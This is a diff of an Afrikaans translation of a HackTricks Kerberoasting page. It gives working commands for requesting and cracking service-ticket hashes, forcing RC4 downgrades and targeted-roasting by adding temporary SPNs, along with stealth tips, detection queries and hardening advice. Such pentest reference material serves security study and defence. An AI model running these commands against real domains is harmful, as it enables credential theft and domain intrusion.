@@ -4,34 +4,34 @@
 
 ## Kerberoast
 
-Kerberoasting fokus op die verkryging van TGS-tickets, spesifiek dié wat verband hou met dienste wat onder gebruikersrekeninge in Active Directory (AD) loop, uitgesluit rekenaarrekeninge. Die enkripsie van hierdie tickets gebruik sleutels wat afkomstig is van gebruikerswagwoorde, wat offline kraak van credentials moontlik maak. Die gebruik van ’n gebruikersrekening as ’n diens word aangedui deur ’n nie-leë ServicePrincipalName (SPN)-eienskap.
+Kerberoasting fokus op die verkryging van TGS tickets, spesifiek dié wat verband hou met dienste wat onder user accounts in Active Directory (AD) loop, met uitsluiting van computer accounts. Die enkripsie van hierdie tickets gebruik keys wat uit user passwords afkomstig is, wat offline credential cracking moontlik maak. Die gebruik van ’n user account as ’n diens word aangedui deur ’n nie-leë ServicePrincipalName (SPN)-eienskap.
 
-Enige geverifieerde domeingebruiker kan TGS-tickets versoek, dus is geen spesiale voorregte nodig nie.
+Enige geauthentiseerde domain user kan TGS tickets aanvra, dus is geen spesiale privileges nodig nie.<sup>[[4]](#references)[[5]](#references)</sup>
 
-### Key Points
+### Sleutelpunte
 
-- Mik op TGS-tickets vir dienste wat onder gebruikersrekeninge loop (d.w.s. rekeninge met SPN gestel; nie rekenaarrekeninge nie).
-- Tickets word geïnkripteer met ’n sleutel afgelei van die diensrekening se wagwoord en kan offline gekraak word.
-- Geen opgehoogde voorregte benodig nie; enige geverifieerde rekening kan TGS-tickets versoek.
+- Teiken TGS tickets vir dienste wat onder user accounts loop (d.w.s. accounts met SPN gestel; nie computer accounts nie).
+- Tickets word geënkripteer met ’n key wat van die service account se password afgelei is en kan offline gekraak word.
+- Geen elevated privileges word vereis nie; enige geauthentiseerde account kan TGS tickets aanvra.
 
 > [!WARNING]
-> Die meeste openbare gereedskap verkies om RC4-HMAC (etype 23) diens-tickets te versoek omdat hulle vinniger gekraak kan word as AES. RC4 TGS-hashe begin met `$krb5tgs$23$*`, AES128 met `$krb5tgs$17$*`, en AES256 met `$krb5tgs$18$*`. Baie omgewings beweeg egter na AES-only. Moenie aanvaar dat slegs RC4 relevant is nie.
-> Vermy ook "spray-and-pray" roasting. Rubeus’ default kerberoast kan navrae doen en tickets vir alle SPNs versoek en is luidrugtig. Eerstens enumereer en teiken interessante principals.
+> Die meeste publieke tools verkies om RC4-HMAC (etype 23) service tickets aan te vra omdat hulle vinniger as AES gekraak kan word. RC4 TGS hashes begin met `$krb5tgs$23$*`, AES128 met `$krb5tgs$17$*`, en AES256 met `$krb5tgs$18$*`. Baie omgewings beweeg egter na AES-only. Moenie aanvaar dat slegs RC4 relevant is nie.
+> Vermy ook “spray-and-pray” roasting. Rubeus se verstek-kerberoast kan navraag doen oor en tickets aanvra vir alle SPNs, en is opvallend. Enumerateer en teiken eers interessante principals.
 
-### Service account secrets & Kerberos crypto cost
+### Service account-secrets & Kerberos-kriptokoste
 
-Baie dienste loop steeds onder gebruikersrekeninge met hand-bestuurde wagwoorde. Die KDC enkripteer diens-tickets met sleutels afgelei van daardie wagwoorde en gee die ciphertext aan enige geverifieerde principal, so kerberoasting gee onbeperkte offline raaispogings sonder lockouts of DC-telemetrie. Die enkripsiemodus bepaal die kraakbegroting:
+Baie dienste loop steeds onder user accounts met handmatig bestuurde passwords. Die KDC enkripteer service tickets met keys wat van daardie passwords afgelei is en gee die ciphertext aan enige geauthentiseerde principal, dus gee kerberoasting onbeperkte offline guesses sonder lockouts of DC telemetry. Die enkripsiemodus bepaal die cracking budget:
 
 | Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
 | --- | --- | --- | --- | --- |
-| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
-| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **miljard** guesses/s | ~1000× vinniger as AES; aanvallers dwing RC4 wanneer `msDS-SupportedEncryptionTypes` dit toelaat. |
+| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blokkeer rainbow tables, maar laat steeds vinnige cracking van kort passwords toe. |
+| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× vinniger as AES; aanvallers forseer RC4 wanneer `msDS-SupportedEncryptionTypes` dit toelaat. |
 
-*Benchmarks van Chick3nman soos in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).
+*Benchmarks van Chick3nman soos d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>
 
-RC4 se confounder randomiseer slegs die keystroom; dit voeg nie werk per raaispoging by nie. Tensy diensrekeninge op ewekansige geheime staatmaak (gMSA/dMSA, machine accounts, of vault-managed strings), is kompromieksnelheid puur ’n GPU-begroting. Om AES-only etypes af te dwing verwyder die miljard-raaispogings-per-sekonde degradasie, maar swak menslike wagwoorde val steeds aan PBKDF2.
+RC4 se confounder randomiseer slegs die keystream; dit voeg nie werk per guess by nie. Tensy service accounts op random secrets (gMSA/dMSA, machine accounts of vault-managed strings) staatmaak, word compromise-spoed uitsluitlik deur die GPU budget bepaal. Die afdwinging van AES-only etypes verwyder die downgrade van ’n biljoen guesses per sekonde, maar swak human passwords val steeds voor PBKDF2.<sup>[[3]](#references)</sup>
 
-### Attack
+### Aanval
 
 #### Linux
 ```bash
@@ -54,7 +54,7 @@ kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o ke
 # 2) Request TGS for selected SPNs and dump
 kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
 ```
-Multifunksie-gereedskap insluitend kerberoast-kontroles:
+Gereedskap met verskeie kenmerke, insluitend kerberoast-kontroles:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
@@ -72,7 +72,7 @@ Get-NetUser -SPN | Select-Object serviceprincipalname
 # Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
 .\Rubeus.exe kerberoast /stats
 ```
-- Technique 1: Vra vir 'n TGS en dump uit die geheue
+- Tegniek 1: Vra vir TGS en dump vanuit memory
 ```powershell
 # Acquire a single service ticket in memory for a known SPN
 Add-Type -AssemblyName System.IdentityModel
@@ -89,7 +89,7 @@ python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
 # Optional: convert john -> hashcat etype23 if needed
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
 ```
-- Tegniek 2: Outomatiese gereedskap
+- Tegniek 2: Outomatiese tools
 ```powershell
 # PowerView — single SPN to hashcat format
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
@@ -104,19 +104,19 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 .\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
 ```
 > [!WARNING]
-> 'n TGS-versoek genereer Windows Sekuriteitsgebeurtenis 4769 ('n Kerberos-dienskaartjie is versoek).
+> 'n TGS-versoek genereer Windows Security Event 4769 ('n Kerberos-dienskaartjie is aangevra).
 
-### OPSEC en omgewings met slegs AES
+### OPSEC en AES-only-omgewings
 
 - Versoek RC4 doelbewus vir rekeninge sonder AES:
-- Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES te enumereer en versoek RC4-dienskaartjies.
-- Rubeus: `/tgtdeleg` met kerberoast veroorsaak ook RC4-versoeke waar moontlik.
-- Roast AES-only rekeninge in plaas daarvan om stilletjies te misluk:
-- Rubeus: `/aes` enumereer rekeninge met AES aangeskakel en versoek AES-dienskaartjies (etype 17/18).
-- As jy reeds 'n TGT hou (PTT of vanaf 'n .kirbi), kan jy `/ticket:<blob|path>` saam met `/spn:<SPN>` of `/spns:<file>` gebruik en LDAP oorslaan.
-- Teiken, throttling en minder geraas:
+- Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES te enumerate en versoek RC4-dienskaartjies.
+- Rubeus: `/tgtdeleg` saam met kerberoast aktiveer ook RC4-versoeke waar moontlik.<sup>[[6]](#references)</sup>
+- Roast AES-only-rekeninge in plaas daarvan om stilweg te faal:
+- Rubeus: `/aes` enumerate rekeninge met AES geaktiveer en versoek AES-dienskaartjies (etype 17/18).
+- As jy reeds 'n TGT besit (PTT of vanaf 'n .kirbi), kan jy `/ticket:<blob|path>` saam met `/spn:<SPN>` of `/spns:<file>` gebruik en LDAP oorslaan.
+- Teikening, throttling en minder geraas:
 - Gebruik `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` en `/jitter:<1-100>`.
-- Filter vir waarskynlike swak wagwoorde deur `/pwdsetbefore:<MM-dd-yyyy>` te gebruik (ouer wagwoorde) of teiken bevoorregte OUs met `/ou:<DN>`.
+- Filter vir waarskynlik swak wagwoorde met `/pwdsetbefore:<MM-dd-yyyy>` (ouer wagwoorde), of teiken bevoorregte OUs met `/ou:<DN>`.<sup>[[8]](#references)</sup>
 
 Examples (Rubeus):
 ```powershell
@@ -140,27 +140,27 @@ hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
 # AES256-CTS-HMAC-SHA1-96 (etype 18)
 hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
 ```
-### Persistensie / Misbruik
+### Persistence / Abuse
 
-As jy 'n rekening beheer of kan wysig, kan jy dit kerberoastable maak deur 'n SPN by te voeg:
+As jy 'n account beheer of dit kan wysig, kan jy dit kerberoastable maak deur 'n SPN by te voeg:
 ```powershell
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
 ```
-Verlaag 'n rekening om RC4 te aktiveer vir makliker cracking (vereis skryfbevoegdhede op die teikenobjek):
+Gradeer ’n rekening af om RC4 te aktiveer vir makliker cracking (vereis skryftoestemmings op die teikenobjek):
 ```powershell
 # Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
 # Mixed RC4+AES (value 28)
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
 ```
-#### Gerigte Kerberoast via GenericWrite/GenericAll oor 'n gebruiker (tydelike SPN)
+#### Targeted Kerberoast via GenericWrite/GenericAll oor ’n gebruiker (tydelike SPN)
 
-Wanneer BloodHound wys dat jy beheer het oor 'n gebruikerobjek (bv. GenericWrite/GenericAll), kan jy daardie spesifieke gebruiker betroubaar “targeted-roast” selfs al het hulle tans geen SPNs nie:
+Wanneer BloodHound wys dat jy beheer oor ’n gebruikersobjek het (bv. GenericWrite/GenericAll), kan jy daardie spesifieke gebruiker betroubaar “targeted-roast”, selfs al het hulle tans geen SPNs nie:<sup>[[9]](#references)</sup>
 
-- Voeg 'n tydelike SPN by die beheerde gebruiker om dit roastable te maak.
-- Vra 'n TGS-REP wat met RC4 (etype 23) geïnkripteer is vir daardie SPN om kraking te bevoordeel.
-- Kraak die `$krb5tgs$23$...` hash met hashcat.
-- Ruim die SPN op om die voetspoor te verminder.
+- Voeg ’n tydelike SPN by die gebruiker waaroor jy beheer het om dit roastable te maak.
+- Versoek ’n TGS-REP wat met RC4 (etype 23) geënkripteer is vir daardie SPN om cracking te bevoordeel.
+- Crack die `$krb5tgs$23$...` hash met hashcat.
+- Verwyder die SPN om die footprint te verminder.
 
 Windows (PowerView/Rubeus):
 ```powershell
@@ -173,31 +173,31 @@ Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSv
 # Remove SPN afterwards
 Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
 ```
-Linux eenreëler (targetedKerberoast.py automatiseer add SPN -> request TGS (etype 23) -> remove SPN):
+Linux one-liner (targetedKerberoast.py outomatiseer add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
 ```bash
 targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
 ```
-Kraak die uitvoer met hashcat autodetect (mode 13100 vir `$krb5tgs$23$`):
+Kraak die uitvoer met hashcat se outodeteksie (modus 13100 vir `$krb5tgs$23$`):
 ```bash
 hashcat <outfile>.hash /path/to/rockyou.txt
 ```
-Opsporingsnotas: die toevoeging/verwydering van SPNs veroorsaak directory-veranderings (Event ID 5136/4738 op die teikenuser) en die TGS-versoek genereer Event ID 4769. Oorweeg throttling en prompt cleanup.
+Opsporingsnotas: die byvoeging/verwydering van SPNs veroorsaak gidsveranderinge (Event ID 5136/4738 op die teikengebruiker), en die TGS-versoek genereer Event ID 4769. Oorweeg throttling en vinnige opruiming.
 
-You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast
+Jy kan nuttige tools vir kerberoast attacks hier vind: https://github.com/nidem/kerberoast
 
-If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:
+As jy hierdie fout vanaf Linux kry: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, word dit deur plaaslike tydverskuiwing veroorsaak. Sinkroniseer met die DC:
 
 - `ntpdate <DC_IP>` (verouderd op sommige distros)
 - `rdate -n <DC_IP>`
 
-### Kerberoast without a domain account (AS-requested STs)
+### Kerberoast sonder 'n domeinrekening (AS-requested STs)
 
-In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.
+In September 2022 het Charlie Clark gewys dat indien 'n principal nie pre-authentication vereis nie, dit moontlik is om 'n service ticket via 'n vervaardigde KRB_AS_REQ te verkry deur die sname in die versoekliggaam te verander, wat effektief 'n service ticket in plaas van 'n TGT verkry. Dit weerspieël AS-REP roasting en vereis nie geldige domeinbewyse nie.
 
-See details: Semperis write-up “New Attack Paths: AS-requested STs”.
+Sien besonderhede: Semperis write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>
 
 > [!WARNING]
-> Jy moet 'n lys gebruikers verskaf omdat jy sonder geldige inlogbewyse nie LDAP met hierdie tegniek kan bevraagteken nie.
+> Jy moet 'n lys gebruikers verskaf, want sonder geldige credentials kan jy nie LDAP met hierdie tegniek navraag doen nie.
 
 Linux
 
@@ -211,9 +211,9 @@ Windows
 ```powershell
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
 ```
-Verwante
+Verwant
 
-As jy AS-REP roastable users teiken, sien ook:
+As jy AS-REP roastable gebruikers teiken, sien ook:
 
 {{#ref}}
 asreproast.md
@@ -221,14 +221,14 @@ asreproast.md
 
 ### Opsporing
 
-Kerberoasting kan sluipend wees. Soek na Event ID 4769 vanaf DCs en pas filters toe om geraas te verminder:
+Kerberoasting kan ongemerk wees. Soek vir Event ID 4769 vanaf DCs en pas filters toe om geraas te verminder:
 
-- Sluit diensnaam `krbtgt` en diensname wat eindig met `$` (rekenaarkonto's) uit.
-- Sluit versoeke van masjienrekeninge (`*$$@*`) uit.
+- Sluit diensnaam `krbtgt` en diensname wat met `$` eindig uit (rekenaarrekeninge).
+- Sluit versoeke vanaf masjienrekeninge (`*$$@*`) uit.
 - Slegs suksesvolle versoeke (Foutkode `0x0`).
-- Bewaak versleutelings-tipes: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moet nie net op `0x17` waarsku nie.
+- Volg enkripsietipes: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moenie slegs op `0x17` waarsku nie.
 
-Example PowerShell triage:
+Voorbeeld PowerShell-triage:
 ```powershell
 Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
 Where-Object {
@@ -240,29 +240,30 @@ Where-Object {
 } |
 Select-Object -ExpandProperty Message
 ```
-Bykomende idees:
+Aanvullende idees:
 
-- Stel 'n basislyn van normale SPN-gebruik per host/gebruiker op; waarsku oor groot uitbarstings van verskillende SPN-versoeke vanaf 'n enkele principal.
-- Merk buitengewone RC4-gebruik in AES-geharde domeine.
+- Stel 'n basislyn vir normale SPN-gebruik per host/gebruiker; genereer 'n alert vir groot sarsies van onderskeie SPN-versoeke vanaf 'n enkele principal.
+- Merk ongewone RC4-gebruik in AES-versterkte domeine.
 
-### Mitigasie / Verharding
+### Versagting / Hardening
 
-- Gebruik gMSA/dMSA of machine accounts vir dienste. Beheerde rekeninge het 120+ karakter ewekansige wagwoorde en roteer outomaties, wat offline krak onprakties maak.
-- Dwing AES af op service accounts deur `msDS-SupportedEncryptionTypes` op AES-only (decimal 24 / hex 0x18) te stel en dan die wagwoord te roteer sodat AES-sleutels afgelei word.
-- Waar moontlik, skakel RC4 in jou omgewing uit en monitor vir gepoogde RC4-gebruik. Op DCs kan jy die `DefaultDomainSupportedEncTypes` registry value gebruik om verstekwaardes te stuur vir rekeninge sonder `msDS-SupportedEncryptionTypes` gestel. Toets deeglik.
-- Verwyder onnodige SPNs van gebruikersrekeninge.
-- Gebruik lang, ewekansige service account wagwoorde (25+ karakters) as beheerde rekeninge nie haalbaar is nie; verbied algemene wagwoorde en ouditeer gereeld.
+- Gebruik gMSA/dMSA- of masjienrekeninge vir services. Managed accounts het wagwoorde van 120+ karakters wat outomaties roteer, wat offline cracking onprakties maak.<sup>[[7]](#references)</sup>
+- Dwing AES af op service accounts deur `msDS-SupportedEncryptionTypes` op slegs AES te stel (desimaal 24 / heksadesimaal 0x18), en roteer dan die wagwoord sodat AES-sleutels afgelei word.<sup>[[7]](#references)</sup>
+- Waar moontlik, deaktiveer RC4 in jou omgewing en monitor vir pogings om RC4 te gebruik. Op DCs kan jy die `DefaultDomainSupportedEncTypes`-registerwaarde gebruik om verstekke te rig vir accounts waar `msDS-SupportedEncryptionTypes` nie gestel is nie. Toets deeglik.
+- Verwyder onnodige SPNs uit user accounts.<sup>[[7]](#references)</sup>
+- Gebruik lang, ewekansige service account-wagwoorde (25+ karakters) indien managed accounts nie haalbaar is nie; verbied algemene wagwoorde en oudit gereeld.<sup>[[7]](#references)</sup>
 
 ## References
 
-- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
-- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
-- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
-- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
-- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
-- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+- [3] [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
+- [4] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
+- [6] [ired.team – Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
+- [7] [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
+- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
+- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
 
 {{#include ../../banners/hacktricks-training.md}}
